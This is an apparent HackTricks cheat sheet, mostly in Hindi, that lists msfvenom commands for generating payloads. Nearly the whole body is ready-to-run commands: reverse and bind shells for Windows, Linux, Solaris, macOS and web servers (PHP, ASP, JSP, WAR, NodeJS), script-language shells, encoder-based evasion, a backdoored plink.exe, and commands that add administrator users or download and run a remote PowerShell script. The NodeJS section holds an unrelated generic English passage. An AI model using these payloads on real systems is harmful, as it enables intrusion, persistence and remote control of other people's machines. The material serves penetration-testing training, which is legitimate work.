# MSFVenom - चीटशीट

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप एक **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof में सभी क्रिप्टो बग बाउंटी होम है।**

**देरी के बिना पुरस्कार प्राप्त करें**\
HackenProof बाउंटी केवल तब शुरू होती हैं जब उनके ग्राहक इनाम बजट जमा करते हैं। आपको इनाम उस बग को सत्यापित करने के बाद मिलेगा।

**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।

**वेब3 हैकर लीजेंड बनें**\
प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।

[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करें!

{% embed url="https://hackenproof.com/register" %}

***

## मूल msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

व्यक्ति आर्किटेक्चर को निर्दिष्ट करने के लिए `-a` भी उपयोग कर सकता है या `--platform`
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## शैलकोड बनाते समय सामान्य पैरामीटर्स

जब हम एक शैलकोड बनाते हैं, तो इसमें आमतौर पर निम्नलिखित पैरामीटर्स होते हैं:

- `--platform` : शैलकोड के लिए चयनित प्लेटफॉर्म (जैसे windows, linux, android)
- `--arch` : शैलकोड के लिए चयनित आर्किटेक्चर (जैसे x86, x64, arm)
- `--payload` : उपयोग किया जाने वाला पेलोड (जैसे reverse shell, bind shell)
- `--encoder` : शैलकोड को एन्कोड करने के लिए चयनित एन्कोडर (जैसे xor, base64)
- `--iterations` : एन्कोडिंग के लिए चयनित इटरेशन्स की संख्या
- `--format` : शैलकोड का चयनित फॉर्मेट (जैसे exe, dll, raw)
- `--out` : निर्मित शैलकोड का नाम और स्थान

ये पैरामीटर्स शैलकोड बनाने के दौरान उपयोग होते हैं।
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **रिवर्स शेल**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### बाइंड शेल

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### उपयोगकर्ता बनाएं

{% code overflow="wrap" %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD शैल

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **कमांड चलाएं**

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### एनकोडर

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### कार्यक्षम में सम्मिलित

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## लिनक्स पेलोड

### रिवर्स शेल

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### बाइंड शेल

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% endcode %}

### SunOS (सोलारिस)

{% code overflow="wrap" %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC पेलोड**

### **रिवर्स शेल:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **बाइंड शेल**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **वेब आधारित Payloads**

### **PHP**

#### रिवर्स शेल

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### रिवर्स शेल

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
{% endcode %}

### JSP

#### रिवर्स शेल

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### WAR

#### रिवर्स शेल

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% endcode %}

### NodeJS

NodeJS is a popular runtime environment for executing JavaScript code outside of a web browser. It allows developers to build scalable and high-performance applications using JavaScript on the server-side. NodeJS provides a rich set of libraries and modules that can be used to develop various types of applications, including web servers, command-line tools, and desktop applications.

NodeJS is built on the V8 JavaScript engine, which is developed by Google and used in the Chrome web browser. This engine compiles JavaScript code into machine code, making it faster and more efficient than traditional interpreters.

One of the key features of NodeJS is its event-driven, non-blocking I/O model. This means that NodeJS can handle a large number of concurrent connections without blocking the execution of other code. This makes it ideal for building real-time applications, such as chat servers and streaming services.

NodeJS also has a built-in package manager called npm (Node Package Manager), which allows developers to easily install and manage third-party libraries and modules. This makes it easy to reuse code and leverage the work of other developers.

Overall, NodeJS is a powerful and versatile platform for building server-side applications with JavaScript. Its performance, scalability, and extensive library ecosystem make it a popular choice among developers.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **स्क्रिप्ट भाषा पेलोड**

### **पर्ल**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% endcode %}

### **Python**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
{% endcode %}

### **बैश**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof में सभी क्रिप्टो बग बाउंटी होती है।**

**देरी के बिना पुरस्कार प्राप्त करें**\
HackenProof बाउंटी तभी शुरू होती हैं जब उनके ग्राहक पुरस्कार बजट जमा करते हैं। आपको बग के सत्यापन के बाद पुरस्कार मिलेगा।

**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।

**वेब3 हैकर लीजेंड बनें**\
प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।

[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करें!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो**? या क्या आपको **PEASS की नवीनतम संस्करण देखना है या HackTricks को PDF में डाउनलोड करना है**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
